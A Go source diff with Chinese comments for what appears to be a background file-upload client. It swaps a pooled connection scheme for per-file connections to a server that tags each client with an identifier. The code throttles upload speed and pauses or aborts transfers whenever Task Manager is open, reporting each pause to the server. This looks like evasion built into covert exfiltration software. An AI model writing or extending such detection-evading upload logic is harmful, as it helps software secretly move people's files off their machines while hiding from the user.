@@ -12,7 +12,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"sync"
 	"sync/atomic"
 	"syscall"
 	"time"
@@ -31,76 +30,6 @@ var (
 	SpeedLimit = 3 * 1024 * 1024 // 默认上传速度限制
 	bufferSize = 32 * 1024       // 32KB缓冲区
 )
-
-// ==================== FILECHECK 专用连接池（关键优化） ====================
-var (
-	checkConnPool = sync.Pool{
-		New: func() any { return nil }, // 初始占位
-	}
-	poolInitOnce sync.Once // 保证全局只初始化一次
-)
-
-// 必须在 uploader.New() 之后调用一次（可以调用 100 次都只生效一次）
-func InitCheckConnPool() error {
-	var err error
-	poolInitOnce.Do(func() {
-		if ServerAddr == "" {
-			err = errors.New("ServerAddr 未设置，请先调用 uploader.New()")
-			return
-		}
-
-		// 真正设置连接创建函数
-		checkConnPool.New = func() any {
-			conn, e := connectWithRetry(ServerAddr, nil)
-			if e != nil {
-				// 不要 panic，让调用方稍后自动重试
-				return nil
-			}
-
-			// 在这里发送一个身份ID,这个SETUUID会在后端记录一个标识clientID,用于会话标识那个用户处理
-			conn.Write([]byte("SETUUID\n" + ClientName + "\n"))
-			return conn
-		}
-
-		// 可选：预热 8 条短连接，让第一次 FILECHECK 几乎无延迟
-		// MaxCheckUploadsSem+5
-		for i := 0; i < 25; i++ {
-			if c := checkConnPool.Get(); c != nil {
-				if conn, ok := c.(net.Conn); ok && conn != nil {
-					checkConnPool.Put(conn)
-				}
-			}
-		}
-	})
-	return err
-}
-
-// 安全获取一个可用的连接（如果池子里暂时没有，会自动创建）
-func getPooledConn() net.Conn {
-	for {
-		obj := checkConnPool.Get()
-		if obj == nil {
-			// 第一次使用或连接创建失败时触发 New()
-			// 注意：checkConnPool.New() 在 InitCheckConnPool 中被设置
-			// 这里调用 Get() 如果返回 nil，说明池中没有，且 New() 初始设置为返回 nil，所以需要再次调用 New 逻辑
-			obj = checkConnPool.New()
-		}
-		if conn, ok := obj.(net.Conn); ok && conn != nil {
-			return conn
-		}
-		// 创建失败，稍等后重试（网络抖动时非常有用）
-		time.Sleep(100 * time.Millisecond)
-	}
-}
-
-// 使用完毕后归还（不关闭，只放回池子）
-func putPooledConn(c net.Conn) {
-	if c == nil {
-		return
-	}
-	c.SetDeadline(time.Time{}) // 清除 deadline，防止影响下一次使用
-	checkConnPool.Put(c)
-}
 
 type WriteCounter struct {
 	Total     int64
@@ -124,9 +53,14 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 	CheckSem <- struct{}{}
 	defer func() { <-CheckSem }()
 
-	// 使用连接池获取一条短连接
-	fConn := getPooledConn()
-	defer putPooledConn(fConn)
+	// 建立专用文件传输连接（带重试）
+	fConn, err := connectWithRetry(ServerAddr, nil)
+	if err != nil {
+		// LogMessage(fmt.Sprintf("连接失败: %v", err))
+		return fmt.Errorf("连接失败: %w", err)
+	}
+	defer fConn.Close()
+
 	// 设置短写入/读取超时以避免长时间阻塞（按需调整）
 	fConn.SetDeadline(time.Now().Add(30 * time.Second)) // FILECHECK 阶段短超时
 
@@ -187,7 +121,7 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 	// <<<=== 新增：任务管理器打开时暂停上传 ===>>>
 	for TaskmgrRunning.Load() {
 		// t.Conn.Write([]byte("NOTIFY\n" + "任务管理器打开时暂停上传,待5秒后重试" + "\n"))
-		NotifyServer("任务管理器打开时暂停上传,待5秒后重试")
+		NotifyServer("任务管理器打开时暂停上传,待5秒后重试", t.Conn)
 		time.Sleep(5 * time.Second)
 	}
 
@@ -263,16 +197,13 @@ func (t *UploadTask) doSendFileWithOutArray(fullPath string) error {
 	modTime := fileInfo.ModTime().Unix()
 	mt := strconv.FormatInt(modTime, 10)
 
-	/* 建立专用文件传输连接（带重试）
+	// 建立专用文件传输连接（带重试）
 	fConn, err := connectWithRetry(ServerAddr, nil)
 	if err != nil {
 		// LogMessage(fmt.Sprintf("连接失败: %v", err))
 		return fmt.Errorf("连接失败: %w", err)
 	}
-	defer fConn.Close()*/
-
-	fConn := getPooledConn()
-	defer putPooledConn(fConn)
+	defer fConn.Close()
 
 	// 设置短写入/读取超时以避免长时间阻塞（按需调整）
 	fConn.SetDeadline(time.Now().Add(30 * time.Minute))
@@ -369,7 +300,7 @@ func (t *UploadTask) rateLimitedCopyWithContext(dst io.Writer, src io.Reader, li
 		// 关键：每读一块就检查一次任务管理器！
 		if TaskmgrRunning.Load() {
 			// t.Conn.Write([]byte("NOTIFY\n" + "检测到任务管理器 → 暂停上传(FILECHECK正常)" + "\n"))
-			NotifyServer(fmt.Sprintf("检测到任务管理器 → 暂停上传(FILECHECK正常),中断传输文件为: %s", filepath.Base(fileName)))
+			NotifyServer(fmt.Sprintf("检测到任务管理器 → 暂停上传(FILECHECK正常),中断传输文件为: %s", filepath.Base(fileName)), t.Conn)
 			return written, fmt.Errorf("任务管理器打开，主动中断传输")
 		}
 
